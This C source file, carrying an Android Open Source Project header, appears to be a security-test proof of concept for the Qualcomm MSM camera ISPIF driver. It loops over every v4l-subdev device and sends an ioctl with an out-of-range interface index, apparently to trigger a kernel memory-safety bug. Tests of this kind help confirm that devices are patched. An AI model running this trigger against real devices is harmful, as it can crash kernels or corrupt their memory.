/**
 * Copyright (C) 2017 The Android Open Source Project
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *      http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

#define _GNU_SOURCE
#include <sys/types.h>
#include <sys/wait.h>

#include <fcntl.h>
#include <stdbool.h>
#include <stdio.h>
#include <stdlib.h>
#include <strings.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <unistd.h>

#define BASE_VIDIOC_PRIVATE 192 /* 192-255 are private */

#define CSID_VERSION_V20 0x02000011
#define CSID_VERSION_V22 0x02001000
#define CSID_VERSION_V30 0x30000000
#define CSID_VERSION_V3 0x30000000

enum msm_ispif_vfe_intf { VFE0, VFE1, VFE_MAX };
#define VFE0_MASK (1 << VFE0)
#define VFE1_MASK (1 << VFE1)

enum msm_ispif_intftype { PIX0, RDI0, PIX1, RDI1, RDI2, INTF_MAX };
#define MAX_PARAM_ENTRIES (INTF_MAX * 2)
#define MAX_CID_CH 8

#define PIX0_MASK (1 << PIX0)
#define PIX1_MASK (1 << PIX1)
#define RDI0_MASK (1 << RDI0)
#define RDI1_MASK (1 << RDI1)
#define RDI2_MASK (1 << RDI2)

enum msm_ispif_vc { VC0, VC1, VC2, VC3, VC_MAX };

enum msm_ispif_cid {
  CID0,
  CID1,
  CID2,
  CID3,
  CID4,
  CID5,
  CID6,
  CID7,
  CID8,
  CID9,
  CID10,
  CID11,
  CID12,
  CID13,
  CID14,
  CID15,
  CID_MAX
};

enum msm_ispif_csid { CSID0, CSID1, CSID2, CSID3, CSID_MAX };

struct msm_ispif_params_entry {
  enum msm_ispif_vfe_intf vfe_intf;
  enum msm_ispif_intftype intftype;
  int num_cids;
  enum msm_ispif_cid cids[3];
  enum msm_ispif_csid csid;
  int crop_enable;
  uint16_t crop_start_pixel;
  uint16_t crop_end_pixel;
};

struct msm_ispif_param_data {
  uint32_t num;
  struct msm_ispif_params_entry entries[MAX_PARAM_ENTRIES];
};

struct msm_isp_info {
  uint32_t max_resolution;
  uint32_t id;
  uint32_t ver;
};

struct msm_ispif_vfe_info {
  int num_vfe;
  struct msm_isp_info info[VFE_MAX];
};

enum ispif_cfg_type_t {
  ISPIF_CLK_ENABLE,
  ISPIF_CLK_DISABLE,
  ISPIF_INIT,
  ISPIF_CFG,
  ISPIF_START_FRAME_BOUNDARY,
  ISPIF_RESTART_FRAME_BOUNDARY,
  ISPIF_STOP_FRAME_BOUNDARY,
  ISPIF_STOP_IMMEDIATELY,
  ISPIF_RELEASE,
  ISPIF_ENABLE_REG_DUMP,
  ISPIF_SET_VFE_INFO,
};

struct ispif_cfg_data {
  enum ispif_cfg_type_t cfg_type;
  union {
    int reg_dump;                       /* ISPIF_ENABLE_REG_DUMP */
    uint32_t csid_version;              /* ISPIF_INIT */
    struct msm_ispif_vfe_info vfe_info; /* ISPIF_SET_VFE_INFO */
    struct msm_ispif_param_data params; /* CFG, START, STOP */
  };
};

#define VIDIOC_MSM_ISPIF_CFG \
  _IOWR('V', BASE_VIDIOC_PRIVATE, struct ispif_cfg_data)

static const int is_bullhead = 0;

char *path_table[] = {
    "/dev/v4l-subdev17",
    "/dev/v4l-subdev15",
};

int main(void) {
  char subdev[32] = {0};
  int i, fd;

  struct ispif_cfg_data pcdata = {0};
  struct ispif_cfg_data pcdata1 = {0};

  pcdata1.cfg_type = ISPIF_INIT;
  pcdata1.csid_version = CSID_VERSION_V30;

  pcdata.cfg_type = ISPIF_STOP_FRAME_BOUNDARY;
  pcdata.params.num = 1;

  for (i = 0; i < pcdata.params.num; i++) {
    pcdata.params.entries[i].vfe_intf = 0x12345601;
    pcdata.params.entries[i].num_cids = 2;
  }

  for (i = 0; i < 32; i++) {
    if (snprintf(subdev, sizeof(subdev), "/dev/v4l-subdev%d", i) < 0) {
      exit(EXIT_FAILURE);
    }

    fd = open(subdev, O_RDWR);

    if (fd > 0) {
      ioctl(fd, VIDIOC_MSM_ISPIF_CFG, &pcdata1);
      ioctl(fd, VIDIOC_MSM_ISPIF_CFG, &pcdata);
      close(fd);
    }

    close(fd);
  }
}
